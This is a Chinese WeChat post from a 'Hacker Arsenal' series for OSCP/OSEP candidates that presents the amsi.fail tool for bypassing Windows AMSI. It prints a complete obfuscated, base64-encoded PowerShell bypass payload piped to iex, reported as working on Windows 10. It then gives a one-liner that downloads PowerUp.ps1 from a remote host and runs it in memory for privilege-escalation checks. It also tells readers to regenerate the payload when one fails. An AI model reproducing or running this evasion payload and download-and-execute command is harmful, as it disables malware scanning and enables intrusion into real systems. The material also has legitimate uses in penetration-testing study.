#  黑客武器库 | AMSI.fail完美bypass AMSI   
原创 玄鹄安全  高级红队专家   2024-12-03 23:06  
  
**0-简介**  
  
【OSCP必备  
】【OSEP必备  
】  
【实战必备  
】  
  
amsi.fail是一款AMSI bypass神器  
  
**1-名称**  
  
```
https://amsi.fail/
```  
  
  
**2-来源**  
```
https://github.com/Flangvik/AMSI.fail
```  
  
**3-用法**  
  
打开https://amsi.fail/，点击“Generate Encoded”生成加密的powershell脚本，在目标机器上运行即可bypass AMSI。下面是一个例子，windows10下亲测可用：  
```
[sySTem.tEXT.enCodinG]::UniCodE.gEtSTriNg([SySTEM.COnVeRT]::FROmBASe64StrING("IwBNAGEAdAB0ACA
ARwByAGEAZQBiAGUAcgBzACAAcwBlAGMAbwBuAGQAIABSAGUAZgBsAGUAYwB0AGkAbwBuACAAbQBlAHQAaABvAGQAIAAKACQAcwBiAE0AVQBGAF8AcAB0ADY
AYQBoAHoAZABQAHAAMQBsAEUAQQA9ACQAbgB1AGwAbAA7ACQAXwBPAF8AegA5ADIAbQBhAHEARABBAFYAVwA2AE4AdwA9ACIAUwB5AHMAdABlAG0ALgAkACg
AKAAnAE0A4ABuAOEAZwDqACcAKwAnAG0A6QBuAHQAJwApAC4AbgBvAHIATQBBAEwAaQBaAGUAKABbAEMASABBAHIAXQAoAFsAQgBZAHQARQBdADAAeAA0ADY
AKQArAFsAQwBoAEEAUgBdACgAMQAxADEAKgA1ADUALwA1ADUAKQArAFsAYwBIAEEAUgBdACgAMQAxADQAKwA2ADAALQA2ADAAKQArAFsAQwBIAEEAcgBdACg
AOQAzACsAMQA2ACkAKwBbAGMAaABhAHIAXQAoADYAOAApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAEMAaABhAHIAXQAoAFsAQgB5AHQARQBdADAAeAA1AGM
AKQArAFsAQwBIAGEAUgBdACgAMQAxADIAKQArAFsAQwBIAGEAUgBdACgAMQAyADMAKQArAFsAQwBIAEEAUgBdACgAMQAxACsANgA2ACkAKwBbAEMAaABBAHI
AXQAoADEAMQAwACkAKwBbAEMAaABBAFIAXQAoAFsAYgBZAFQARQBdADAAeAA3AGQAKQApAC4AJAAoACgAJwDAAPsAdAD1ACcAKwAnAG0A4gB0AO0AJwArACc
A9ABuACcAKQAuAG4AbwByAE0AYQBsAEkAWgBlACgAWwBDAGgAQQByAF0AKABbAGIAWQB0AGUAXQAwAHgANAA2ACkAKwBbAGMAaABBAHIAXQAoAFsAQgBZAFQ
ARQBdADAAeAA2AGYAKQArAFsAQwBIAEEAUgBdACgAWwBCAFkAdABlAF0AMAB4ADcAMgApACsAWwBDAGgAYQByAF0AKAA0ADYAKwA2ADMAKQArAFsAYwBoAEE
AcgBdACgANgA4ACoAMQA0AC8AMQA0ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAQwBIAGEAcgBdACgAWwBCAFkAVABFAF0AMAB4ADUAYwApACsAWwBjAEg
AQQByAF0AKABbAEIAeQB0AEUAXQAwAHgANwAwACkAKwBbAGMASABBAFIAXQAoAFsAQgB5AFQARQBdADAAeAA3AGIAKQArAFsAQwBoAGEAcgBdACgAWwBCAFk
AdABlAF0AMAB4ADQAZAApACsAWwBDAEgAQQBSAF0AKAA1ACsAMQAwADUAKQArAFsAYwBIAGEAcgBdACgAWwBCAHkAdABFAF0AMAB4ADcAZAApACkALgAkACg
AWwBDAGgAYQBSAF0AKAAxADAAKwA1ADUAKQArAFsAQwBIAEEAUgBdACgAMQAwADkAKwA4ADkALQA4ADkAKQArAFsAYwBIAEEAUgBdACgAWwBiAFkAdABFAF0
AMAB4ADcAMwApACsAWwBDAEgAQQByAF0AKABbAEIAWQB0AEUAXQAwAHgANgA5ACkAKwBbAEMASABBAHIAXQAoAFsAYgBZAFQAZQBdADAAeAA1ADUAKQArAFs
AYwBIAEEAUgBdACgANAA0ACsANwAyACkAKwBbAGMAaABBAHIAXQAoAFsAYgB5AFQARQBdADAAeAA2ADkAKQArAFsAQwBoAEEAcgBdACgAWwBCAHkAVABFAF0
AMAB4ADYAYwApACsAWwBDAEgAYQBSAF0AKAA2ADkAKwA0ADYAKQApACIAOwAkAHIAdgBwAHQAegBqAGQAdwB2AG4AeAB1AHQAagBxAHkAbwBiAGYAcAB2AD0
AIgArACgAJwDpACcAKwAnAOwAJwArACcAYgAnACkALgBuAE8AUgBtAEEAbABJAHoAZQAoAFsAYwBoAEEAUgBdACgANwAwACoANQA4AC8ANQA4ACkAKwBbAEM
ASABBAHIAXQAoADQAOQArADYAMgApACsAWwBDAGgAQQByAF0AKAA3ADQAKwA0ADAAKQArAFsAQwBoAEEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADYAZAApACs
AWwBjAEgAQQByAF0AKAA2ADgAKwA5AC0AOQApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAEMASABBAHIAXQAoADMANgArADUANgApACsAWwBDAEgAYQBSAF0
AKABbAGIAWQB0AGUAXQAwAHgANwAwACkAKwBbAGMASABBAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA3AGIAKQArAFsAQwBoAEEAUgBdACgANwA3ACsAMwAxAC0
AMwAxACkAKwBbAEMASABhAFIAXQAoADEAMQAwACsANQA0AC0ANQA0ACkAKwBbAGMASABhAHIAXQAoADEAMgA1ACsANAAwAC0ANAAwACkAIgA7AFsAVABoAHI
AZQBhAGQAaQBuAGcALgBUAGgAcgBlAGEAZABdADoAOgBTAGwAZQBlAHAAKAAxADQANwA2ACkAOwBbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFM
AZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAKAAiACQAKAAoACcAVwByAO4AdAAnACsAJwDqAM0AbgB0ACcAKwAnADMAMgAnACkALgBOAG8
AcgBNAEEAbABpAFoAZQAoAFsAQwBIAGEAcgBdACgANwAwACkAKwBbAGMASABBAFIAXQAoADEAMQAxACkAKwBbAEMAaABhAFIAXQAoAFsAQgBZAFQAZQBdADA
AeAA3ADIAKQArAFsAQwBIAEEAcgBdACgAWwBiAHkAdABFAF0AMAB4ADYAZAApACsAWwBjAGgAYQBSAF0AKABbAGIAeQB0AEUAXQAwAHgANAA0ACkAKQAgAC0
AcgBlAHAAbABhAGMAZQAgAFsAYwBIAEEAcgBdACgANAA0ACsANAA4ACkAKwBbAEMASABhAHIAXQAoADEAMQAyACsAMwAwAC0AMwAwACkAKwBbAEMAaABhAHI
AXQAoADEAMgAzACoANQA4AC8ANQA4ACkAKwBbAGMASABBAHIAXQAoADUANQArADIAMgApACsAWwBjAGgAQQByAF0AKABbAEIAeQB0AEUAXQAwAHgANgBlACk
AKwBbAEMASABBAHIAXQAoAFsAYgB5AFQAZQBdADAAeAA3AGQAKQApACIAKQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGU
AKAAkAF8ATwBfAHoAOQAyAG0AYQBxAEQAQQBWAFcANgBOAHcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACIAJAAoAFsAQwBIAEEAUgBdACgAWwBiAHkAdABFAF0
AMAB4ADYAMQApACsAWwBjAGgAYQByAF0AKAAxADAAOQArADcANwAtADcANwApACsAWwBDAGgAYQBSAF0AKABbAGIAeQB0AEUAXQAwAHgANwAzACkAKwBbAEM
ASABhAHIAXQAoADEAMAA1ACkAKwBbAGMASABhAHIAXQAoAFsAYgB5AHQARQBdADAAeAA0ADMAKQArAFsAQwBIAGEAcgBdACgAMQAxADEAKQArAFsAYwBIAEE
AcgBdACgAWwBiAFkAVABlAF0AMAB4ADYAZQApACsAWwBjAGgAQQByAF0AKAAxADEANgArADIANwAtADIANwApACsAWwBDAEgAQQByAF0AKAAxADAAMQArADQ
AOAAtADQAOAApACsAWwBDAEgAYQBSAF0AKAAxADIAMAArADMANwAtADMANwApACsAWwBjAEgAQQByAF0AKABbAGIAWQB0AEUAXQAwAHgANwA0ACkAKQAiACw
AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQgBpAG4AZABpAG4AZwBGAGwAYQBnAHMAXQAiAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAIgApAC4
ARwBlAHQAVgBhAGwAdQBlACgAJABzAGIATQBVAEYAXwBwAHQANgBhAGgAegBkAFAAcAAxAGwARQBBACkALAAwAHgAMgBjADUAYQAzADAAZAA0ACkAOwAkAGg
AYgBuAHEAcgBuAGMAYwBrAGIAYQB1AGQAYQB6AHgAYgBsAGIAdgBoAG0AYgBkAGcAZwBvAG0APQAiACsAKAAnAHMAbgBzACcAKwAnAHgAcgB5ACcAKQAuAG4
ATwByAG0AQQBMAEkAWgBFACgAWwBjAGgAYQByAF0AKABbAEIAWQBUAEUAXQAwAHgANAA2ACkAKwBbAGMASABBAHIAXQAoADEAMQAxACoAMgAxAC8AMgAxACk
AKwBbAGMAaABhAFIAXQAoAFsAQgBZAHQARQBdADAAeAA3ADIAKQArAFsAQwBIAEEAcgBdACgAWwBiAHkAVABlAF0AMAB4ADYAZAApACsAWwBDAEgAYQBSAF0
AKABbAGIAWQB0AEUAXQAwAHgANAA0ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAQwBIAEEAUgBdACgAWwBCAHkAdABFAF0AMAB4ADUAYwApACsAWwBDAEg
AQQByAF0AKAAzADUAKwA3ADcAKQArAFsAYwBIAEEAcgBdACgAMQAxADAAKwAxADMAKQArAFsAYwBIAGEAUgBdACgANgArADcAMQApACsAWwBjAEgAYQBSAF0
AKABbAGIAWQB0AGUAXQAwAHgANgBlACkAKwBbAGMAaABBAFIAXQAoAFsAYgBZAHQAZQBdADAAeAA3AGQAKQAiADsAWwBUAGgAcgBlAGEAZABpAG4AZwAuAFQ
AaAByAGUAYQBkAF0AOgA6AFMAbABlAGUAcAAoADEANgA5ADQAKQA="))|iex
```  
  
后面再执行就可以bypass AMSI了  
```
iex ((New-Object System.Net.WebClient).DownloadString("http://192.168.136.131/PowerUp.ps1"))
Invoke-AllChecks
```  
  
**4-实际案例**  
  
**加载PowerUp被禁止:**  
```
iex ((New-Object System.Net.WebClient).DownloadString("http://192.168.136.131/PowerUp.ps1"))
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umdnBWI6ibpLtPGNib6FUjkpkUqUYnDJceqzQ2tuNfrE5g2Na9rvouUN4U3D0pq4KBKUZ048poWMvxoQ/640?wx_fmt=png&from=appmsg "")  
  
**生成bypass AMSI命令并执行：**  
```
https://amsi.fail/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umdnBWI6ibpLtPGNib6FUjkpkUZOoeVyhWvvzKvDibzo5gia4IjR8iaEHCNB3Evt2d3icicB3ia19OPpEQQhOA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VZNmh6ic5umdnBWI6ibpLtPGNib6FUjkpkUIWvydL71RfCK54SZIC9gwB3wCyiaeqAc9NM6G6bCpZRY30ZriafIkdYg/640?wx_fmt=png&from=appmsg "")  
  
执行成果，完美bypass AMSI  
  
**考试技巧：**  
  
https://amsi.fail/中的代码不一定每次都可以成功bypass，如果不成功再生成一个再执行即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VZNmh6ic5umdJEQHgyFkaSKNicmUpUQhdRTvrhqbPbkgfKC7Q7GibHIaU60jEcusoibjC8EvJkNGrVo2Hlib3Z809NQ/640?wx_fmt=jpeg&from=appmsg "")  
  
往期精选：  
  
[黑客武器库 | 开篇](https://mp.weixin.qq.com/s?__biz=MzIzODMyMzQxNQ==&mid=2247483902&idx=1&sn=958654c5a58e7ca7ea5288726f54d909&scene=21#wechat_redirect)  
  
  
[黑客武器库 | RustScan](https://mp.weixin.qq.com/s?__biz=MzIzODMyMzQxNQ==&mid=2247483942&idx=1&sn=5204c46412a10380a897adcd6c59ae2c&scene=21#wechat_redirect)  
  
  
[黑客武器库 | CobaltSrike](https://mp.weixin.qq.com/s?__biz=MzIzODMyMzQxNQ==&mid=2247484051&idx=1&sn=12a52e087b27833e54aee2dd3485b57a&scene=21#wechat_redirect)  
  
  
[黑客武器库 | IDA BETA 9.0](https://mp.weixin.qq.com/s?__biz=MzIzODMyMzQxNQ==&mid=2247484065&idx=1&sn=5f19f0936d483b3efb948785de9129a8&scene=21#wechat_redirect)  
  
  
[黑客武器库 | Linux提权神器GTFOBins](https://mp.weixin.qq.com/s?__biz=MzIzODMyMzQxNQ==&mid=2247484132&idx=1&sn=ab7cc66893a29e29eb5c9293ac3e555d&scene=21#wechat_redirect)  
  
  
**更多技术资料加Q群获取交流**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VZNmh6ic5ume2jmTJQmbJibm5HL4ZuZJT0bnradFAnla3kFxr2XU1o9kFVTbos0go4zutJibuysORoZiafxzhgL8Zw/640?wx_fmt=jpeg "")  
  
  
  
  
  
  
  
  
  
  
  
  
